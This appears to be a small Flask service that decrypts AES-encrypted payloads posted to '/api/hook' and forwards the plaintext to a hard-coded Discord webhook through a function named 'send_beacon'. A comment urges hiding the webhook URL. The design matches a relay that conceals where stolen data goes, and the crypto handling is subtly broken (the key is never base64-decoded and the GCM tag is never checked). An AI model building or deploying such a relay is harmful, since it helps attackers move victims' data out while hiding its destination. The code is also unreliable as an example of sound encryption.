import os
import json
import base64
import requests
from flask import Flask, request, jsonify
from Crypto.Cipher import AES

app = Flask(__name__)

def decrypt(ciphertext: bytes, key: bytes) -> str:
    cipher = AES.new(key, AES.MODE_GCM, nonce=ciphertext[:16])
    return cipher.decrypt(ciphertext[16:]).decode()

def send_beacon(data: dict):
    # replace with own discord webhook url and try to find out how to encrypt webhook url
    webhook = "https://discord.com/api/webhooks/1234567890/ABC123"
    requests.post(webhook, json=data)

@app.route('/api/hook', methods=['POST'])
def main():
    if request.method == "POST":
        body = request.get_json()
        if not body or "data" not in body:
            return jsonify({"error": "Invalid payload"}), 400
        encrypted = base64.b64decode(body["data"])
        key = os.getenv("CRYPTO_KEY").encode()  # Set in Vercel env as base64-encoded 32-byte key
        try:
            payload = decrypt(encrypted, key)
            send_beacon({"content": payload})
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
